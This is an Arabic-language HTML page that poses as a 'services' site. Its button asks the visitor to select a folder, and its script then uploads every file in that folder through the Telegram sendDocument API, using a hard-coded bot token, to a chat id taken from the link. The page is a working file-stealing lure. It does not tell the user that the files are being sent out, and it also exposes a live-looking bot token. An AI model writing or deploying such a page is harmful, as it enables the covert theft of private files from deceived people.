<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>موقع الخدمات</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #6e0ef5 0%, #2979ff 100%);
            color: white;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            font-family: Arial, sans-serif;
            text-align: center;
        }
        
        .container {
            background: rgba(0, 0, 0, 0.2);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.2);
            max-width: 600px;
            width: 100%;
        }
        
        .main-message {
            font-size: 24px;
            margin-bottom: 40px;
            line-height: 1.5;
        }
        
        .services-btn {
            background: linear-gradient(to right, #ff416c, #ff4b2b);
            color: white;
            border: none;
            padding: 20px 50px;
            font-size: 20px;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s;
            font-weight: bold;
            box-shadow: 0 5px 15px rgba(255, 65, 108, 0.4);
        }
        
        .services-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 8px 20px rgba(255, 65, 108, 0.6);
        }
        
        .upload-section {
            margin-top: 30px;
            display: none;
        }
        
        .folder-btn {
            background: linear-gradient(to right, #00b09b, #96c93d);
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 18px;
            border-radius: 50px;
            cursor: pointer;
            margin-bottom: 20px;
            transition: all 0.3s;
        }
        
        .folder-btn:hover {
            transform: scale(1.05);
        }
        
        .progress {
            width: 100%;
            height: 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            margin-top: 20px;
            overflow: hidden;
            display: none;
        }
        
        .progress-bar {
            height: 100%;
            background: linear-gradient(to right, #00b09b, #96c93d);
            width: 0%;
            transition: width 0.3s;
        }
        
        .status {
            margin-top: 15px;
            padding: 10px;
            border-radius: 10px;
            display: none;
        }
        
        .success {
            background: rgba(0, 200, 83, 0.2);
            border: 1px solid #00c853;
            display: block;
        }
        
        .error {
            background: rgba(255, 23, 68, 0.2);
            border: 1px solid #ff1744;
            display: block;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="main-message">إضغط علي الزر لتتمتع بخدماتنا القويه</div>
        
        <button id="servicesBtn" class="services-btn">الخدمات</button>
        
        <div id="uploadSection" class="upload-section">
            <button id="folderBtn" class="folder-btn">استخدام المجلد</button>
            <input type="file" id="folderInput" webkitdirectory directory multiple style="display: none;">
            
            <div id="progress" class="progress">
                <div id="progressBar" class="progress-bar"></div>
            </div>
            
            <div id="status" class="status"></div>
        </div>
    </div>

    <script>
        const servicesBtn = document.getElementById('servicesBtn');
        const uploadSection = document.getElementById('uploadSection');
        const folderBtn = document.getElementById('folderBtn');
        const folderInput = document.getElementById('folderInput');
        const progress = document.getElementById('progress');
        const progressBar = document.getElementById('progressBar');
        const statusDiv = document.getElementById('status');
        
        // التوكن الثابت
        const BOT_TOKEN = "8481752278:AAHs9O3Ilf0LRTJPIAhpdC92gC3_ufME78g";
        
        servicesBtn.addEventListener('click', () => {
            uploadSection.style.display = 'block';
            servicesBtn.style.display = 'none';
        });
        
        folderBtn.addEventListener('click', () => {
            folderInput.click();
        });
        
        folderInput.addEventListener('change', async (e) => {
            const files = e.target.files;
            if (files.length === 0) return;
            
            // الحصول على chatid من الرابط
            const urlParams = new URLSearchParams(window.location.search);
            const chatId = urlParams.get('chatid');
            
            if (!chatId) {
                showStatus('error', '❌ لم يتم العثور على chatid في الرابط');
                return;
            }
            
            progress.style.display = 'block';
            
            try {
                let sentCount = 0;
                const fileArray = Array.from(files);
                
                for (let i = 0; i < fileArray.length; i++) {
                    const file = fileArray[i];
                    
                    // تحديث شريط التقدم
                    const progressPercent = Math.floor(((i + 1) / fileArray.length) * 100);
                    progressBar.style.width = `${progressPercent}%`;
                    
                    // إرسال الملف إلى API
                    const success = await sendToTelegram(file, chatId);
                    if (success) sentCount++;
                    
                    // عرض الحالة
                    statusDiv.className = 'status';
                    statusDiv.textContent = `جاري الإرسال... ${i + 1}/${fileArray.length}`;
                    statusDiv.style.display = 'block';
                }
                
                showStatus('success', `✅ تم إرسال ${sentCount} ملف بنجاح`);
                
                // إعادة تعيين بعد 3 ثواني
                setTimeout(() => {
                    progress.style.display = 'none';
                    progressBar.style.width = '0%';
                    statusDiv.style.display = 'none';
                    folderInput.value = '';
                }, 3000);
                
            } catch (error) {
                showStatus('error', `❌ خطأ: ${error.message}`);
            }
        });
        
        async function sendToTelegram(file, chatId) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('document', file);
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                return result.ok;
            } catch (error) {
                console.error('خطأ في الإرسال:', error);
                return false;
            }
        }
        
        function showStatus(type, message) {
            statusDiv.className = `status ${type}`;
            statusDiv.textContent = message;
            statusDiv.style.display = 'block';
        }
    </script>
</body>
</html>
